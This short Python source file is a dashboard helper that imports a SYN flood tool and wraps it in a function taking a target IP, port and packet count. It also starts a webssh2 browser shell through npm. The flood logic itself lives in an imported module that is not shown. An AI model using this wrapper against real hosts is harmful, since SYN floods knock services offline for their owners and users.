import os
import sys
import subprocess
import pdb


###############################SYN FLOOD ATTACK########################################
DashboardScriptDir = os.path.dirname(os.path.abspath(__file__))
PythonSynAttackDir = os.path.join(DashboardScriptDir, 'Python-SYN-Flood-Attack-Tool/')
sys.path.append(PythonSynAttackDir)

from py3_synflood_cmd import SYN_Flood


def syn_flood_attack(dstIP, dstPort, counter):
    try :
        SYN_Flood(dstIP, dstPort, counter)
        return 0
    except :
        return -1


def setup_shell():
    try :
        os.chdir('additional_features/webssh2/app/')
        cmd = ['npm', 'start'] #begin at ptoject's root location !!!!
        subprocess.Popen(cmd)
        return 0
    except :
        return -1

